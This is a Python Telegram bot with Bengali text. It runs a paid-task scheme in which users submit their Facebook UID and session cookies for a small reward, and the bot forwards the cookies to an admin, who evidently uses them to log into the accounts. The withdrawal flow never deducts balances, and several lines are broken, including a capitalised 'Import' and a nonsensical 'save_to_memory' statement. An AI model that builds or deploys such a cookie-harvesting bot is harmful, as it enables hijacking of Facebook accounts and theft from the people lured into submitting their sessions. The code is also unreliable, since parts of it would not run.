Import logging
import os
import sqlite3
import threading
from flask import Flask
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# রেন্ডারের এনভায়রনমেন্ট ভ্যারিয়েবল থেকে টোকেন এবং অ্যাডমিন আইডি রিড করবে
API_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_STR = os.getenv("ADMIN_ID")

if not API_TOKEN:
    raise ValueError("BOT_TOKEN এনভায়রনমেন্ট ভ্যারিয়েবল সেট করা নেই।")

if not ADMIN_ID_STR:
    raise ValueError("ADMIN_ID সেট করা নেই। আপনার Telegram numeric user ID environment variable হিসেবে সেট করুন।")

ADMIN_ID = int(ADMIN_ID_STR)

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# ---------------------------------------------------------
# ডাটাবেস ইনিশিয়ালাইজেশন (SQLite Database Setup)
# ---------------------------------------------------------
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.0,
            total_income REAL DEFAULT 0.0,
            completed_tasks INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance, total_income, completed_tasks FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if not row:
        cursor.execute("INSERT INTO users (user_id, balance, total_income, completed_tasks) VALUES (?, 0.0, 0.0, 0)", (user_id,))
        conn.commit()
        row = (0.0, 0.0, 0)
    conn.close()
    return row

def update_user_balance(user_id, amount):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        UPDATE users 
        SET balance = balance + ?, total_income = total_income + ?, completed_tasks = completed_tasks + 1 
        WHERE user_id = ?
    """, (amount, amount, user_id))
    conn.commit()
    conn.close()

# ---------------------------------------------------------
# রেন্ডার ফ্রি টিয়ার পোর্টের জন্য ফ্লাস্ক সার্ভার (Web Service Port Requirement)
# ---------------------------------------------------------
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running 24/7 successfully with Database!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask).start()


# --- স্টেট (FSM) ক্লাসসমূহ ---
class FacebookTaskState(StatesGroup):
    waiting_for_uid = State()
    waiting_for_cookies = State()

class WithdrawFlow(StatesGroup):
    waiting_for_address_or_number = State()
    waiting_for_amount = State()

# ---------------------------------------------------------
# ১. ব্যালেন্স ড্যাশবোর্ড সিস্টেম
# ---------------------------------------------------------
@dp.message_handler(text="💰 ব্যালেন্স")
async def show_user_balance(message: types.Message):
    user_id = message.from_user.id
    balance, total_income, completed_tasks = get_user(user_id)
    
    pending_withdraw = 0.00
    pending_review = "0.00"
    
    balance_text = (
        f"💵 আপনার ব্যালেন্স\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💵 ব্যালেন্স: {balance:.2f} BDT\n"
        f"💸 পেন্ডিং (উইথড্র): {pending_withdraw:.2f} BDT\n"
        f"💰 Total Income: {total_income:.2f} BDT\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ সম্পন্ন কাজ: {completed_tasks:02d}টি\n"
        f"⏳ রিভিউতে আছে: {pending_review} টি"
    )
    
    await message.reply(balance_text)


# ---------------------------------------------------------
# ২. ফেসবুক টাস্ক সিস্টেম
# ---------------------------------------------------------
@dp.callback_query_handler(text="submit_fb_uid")
async def request_fb_uid(call: types.CallbackQuery):
    await call.message.answer("আপনার ফেসবুক অ্যাকাউন্টের ১৪ থেকে ১৬ সংখ্যার UID-টি দিন:")
    await FacebookTaskState.waiting_for_uid.set()
    await call.answer()

@dp.message_handler(state=FacebookTaskState.waiting_for_uid)
async def receive_fb_uid(message: types.Message, state: FSMContext):
    user_uid = message.text.strip()
    await state.update_data(user_uid=user_uid)
    
    await message.reply("📘 এবার আপনার ফেসবুক অ্যাকাউন্টের Cookies-টি দিন:")
    await FacebookTaskState.waiting_for_cookies.set()

@dp.message_handler(state=FacebookTaskState.waiting_for_cookies)
async def receive_fb_cookies(message: types.Message, state: FSMContext):
    user_cookies = message.text.strip()
    data = await state.get_data()
    user_uid = data.get('user_uid')
    user_id = message.from_user.id
    reward = 4.00
    
    admin_keyboard = InlineKeyboardMarkup(row_width=2)
    btn_approve = InlineKeyboardButton("🔘 OK", callback_data=f"approve_fb_{user_id}_{reward}")
    btn_reject = InlineKeyboardButton("❌ Reject", callback_data=f"reject_fb_{user_id}_{user_uid}")
    admin_keyboard.add(btn_approve, btn_reject)
    
    await bot.send_message(
        ADMIN_ID,
        f"🔔 **নতুন ফেসবুক কাজ জমা পড়েছে!**\n\n"
        f"👤 ইউজার আইডি: `{user_id}`\n"
        f"🆔 UID: `{user_uid}`\n"
        f"🍪 Cookies: `{user_cookies}`\n"
        f"💰 রেট: ৳{reward}",
        parse_mode="Markdown",
        reply_markup=admin_keyboard
    )
    
    await message.reply("এই কাজের রিপোর্ট খুব তাড়াতাড়ি আসবে, তাই সবাই আর দেরি না করে আরও বেশি করে কাজ করুন।")
    await state.finish()

@dp.callback_query_handler(text_startswith="approve_fb_")
async def admin_approve_fb(call: types.CallbackQuery):
    parts = call.data.split("_")
    user_id = int(parts[2])
    reward = float(parts[3])
    
    update_user_balance(user_id, reward)
    
    await bot.send_message(
        user_id,
        f"💎 কাজ এপ্রুভ হয়েছে: **+{reward:.2f} BDT** আপনার ব্যালেন্সে যোগ হয়েছে! 😄"
    )
    await call.message.edit_text(call.message.text + f"\n\n✅ **এপ্রুভ করা হয়েছে (+৳{reward})।**")
    await call.answer()

@dp.callback_query_handler(text_startswith="reject_fb_")
async def admin_reject_fb(call: types.CallbackQuery):
    parts = call.data.split("_")
    user_id = int(parts[2])
    user_uid = parts[3]
    
    await bot.send_message(
        user_id,
        f"🔴 **UID: {user_uid}** | পাসওয়ার্ড বা কুকিজ সঠিক নয় (লগইন হচ্ছে না😭)"
    )
    await call.message.edit_text(call.message.text + "\n\n❌ **বাতিল করা হয়েছে।**")
    await call.answer()


# ---------------------------------------------------------
# ৩. উইথড্র (Withdrawal) সিস্টেম
# ---------------------------------------------------------
@dp.message_handler(text="টাকা উত্তোলন")
async def withdraw_menu(message: types.Message):
    keyboard = InlineKeyboardMarkup(row_width=1)
    btn_usdt = InlineKeyboardButton("🪙 USDT (BEP-20) -> সর্বনিম্ন: 0.25 (-0.05)", callback_data="withdraw_usdt")
    btn_bkash = InlineKeyboardButton("💳 বিকাশ -> সর্বনিম্ন: ১১০৳ (-১০)", callback_data="withdraw_bkash")
    btn_nagad = InlineKeyboardButton("🟠 নগদ -> সর্বনিম্ন: ১০০৳ (-১০)", callback_data="withdraw_nagad")
    btn_back = InlineKeyboardButton("⬅️ ফিরে যান", callback_data="back_to_main_menu")
    
    keyboard.add(btn_usdt, btn_bkash, btn_nagad, btn_back)
    await message.reply("💵 **টাকা তোলার মাধ্যম সিলেক্ট করুন:**", reply_markup=keyboard, parse_mode="Markdown")

@dp.callback_query_handler(text="withdraw_usdt")
async def withdraw_usdt_start(call: types.CallbackQuery, state: FSMContext):
    await state.update_data(method="USDT", min_limit=0.25)
    await call.message.answer("🪙 আপনার **Binance PayID / USDT (BEP-20) Address** টি দিন:")
    await WithdrawFlow.waiting_for_address_or_number.set()
    await call.answer()

@dp.callback_query_handler(text=["withdraw_bkash", "withdraw_nagad"])
async def withdraw_mfs_start(call: types.CallbackQuery, state: FSMContext):
    method = "Bkash" if call.data == "withdraw_bkash" else "Nagad"
    min_limit = 110.0 if method == "Bkash" else 100.0
    
    await state.update_data(method=method, min_limit=min_limit)
    await call.message.answer(f"📱 আপনার **{method} Personal** নাম্বারটি দিন:")
    await WithdrawFlow.waiting_for_address_or_number.set()
    await call.answer()

@dp.message_handler(state=WithdrawFlow.waiting_for_address_or_number)
async def receive_target_info(message: types.Message, state: FSMContext):
    target_info = message.text.strip()
    await state.update_data(target_info=target_info)
    
    await message.reply("💵 কত টাকা/USDT উইথড্র করতে চান তার পরিমাণ লিখুন:")
    await WithdrawFlow.waiting_for_amount.set()

@dp.message_handler(state=WithdrawFlow.waiting_for_amount)
async def process_withdraw_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
    except ValueError:
        await message.reply("⚠️ দয়া করে সঠিক সংখ্যা লিখুন:")
        return

    user_id = message.from_user.id
    data = await state.get_data()
    method = data.get("method")
    min_limit = data.get("min_limit")
    target_info = data.get("target_info")
    
    user_balance, _, _ = get_user(user_id)

    if amount < min_limit or user_balance < amount:
        if method == "USDT":
            await message.reply(
                f"❌ আপনার ব্যালেন্স পর্যাপ্ত নয়। মিনিমাম উইথড্র {min_limit} USDT。\n"
                f"আপনার ব্যালেন্স: {user_balance} usdt"
            )
        else:
            await message.reply(
                f"❌ আপনার ব্যালেন্স পর্যাপ্ত নয়। {method}-এ উইথড্র দিতে কমপক্ষে {min_limit:.2f} ৳ প্রয়োজন。\n"
                f"আপনার বর্তমান ব্যালেন্স: {user_balance} ৳"
            )
        await state.finish()
        return

    # Callback data-তে স্পেস এড়াতে method-এর নাম সংক্ষিপ্ত রাখা হয়েছে
    admin_kb = InlineKeyboardMarkup(row_width=2)
    btn_approve = InlineKeyboardButton("✅ Pay Done", callback_data=f"w_app_{user_id}_{amount}_{method}")
    btn_reject = InlineKeyboardButton("❌ Reject", callback_data=f"w_rej_{user_id}_{min_limit}_{method}")
    admin_kb.add(btn_approve, btn_reject)

    await bot.send_message(
        ADMIN_ID,
        f"🏧 **নতুন উইথড্র রিকোয়েস্ট!**\n\n"
        f"👤 ইউজার আইডি: `{user_id}`\n"
        f"💳 মাধ্যম: **{method}**\n"
        f"📌 নাম্বার/লিংক: `{target_info}`\n"
        f"💰 পরিমাণ: **{amount}**\n"
        f"💵 ইউজারের ব্যালেন্স: `{user_balance}`",
        parse_mode="Markdown",
        reply_markup=admin_kb
    )

    if method == "USDT":
        await message.reply("✅ আপনার উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে।")
    else:
        await message.reply("✅ আপনার টাকা 1 থেকে 2 ঘন্টার ভিতরে এড হয়ে জাবে।")
        
    await state.finish()

@dp.callback_query_handler(text_startswith="w_app_")
async def admin_withdraw_approve(call: types.CallbackQuery):
    parts = call.data.split("_")
    user_id = int(parts[2])
    amount = parts[3]
    method = parts[4]

    unit = 'USDT' if 'USDT' in method else '৳'
    await bot.send_message(
        user_id,
        f"🎉 আপনার একাউন্টে টাকা জমা হয়ে গেছে! পরিমাণ: {amount} {unit}"
    )
    await call.message.edit_text(call.message.text + "\n\n✅ **পেমেন্ট সফলভাবে সম্পন্ন হয়েছে।**")
    await call.answer()

@dp.callback_query_handler(text_startswith="w_rej_")
async def admin_withdraw_reject(call: types.CallbackQuery):
    parts = call.data.split("_")
    user_id = int(parts[2])
    min_limit = parts[3]
    method = parts[4]
    
    user_balance, _, _ = get_user(user_id)

    if "USDT" in method:
        await bot.send_message(user_id, f"❌ উইথড্র বাতিল হয়েছে। মিনিমাম উইথড্র {min_limit} USDT。\nআপনার ব্যালেন্স: {user_balance} USDT")
    else:
        await bot.save_to_memory if hasattr(bot, 'save_to_memory') else None
        await bot.send_message(
            user_id,
            f"❌ আপনার {method} উইথড্র রিকোয়েস্ট বাতিল করা হয়েছে। পর্যাপ্ত ব্যালেন্স বা সঠিক তথ্য না থাকায় এটি রিজেক্ট করা হয়।"
        )

    await call.message.edit_text(call.message.text + "\n\n❌ **উইথড্র রিকোয়েস্ট বাতিল করা হয়েছে।**")
    await call.answer()


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
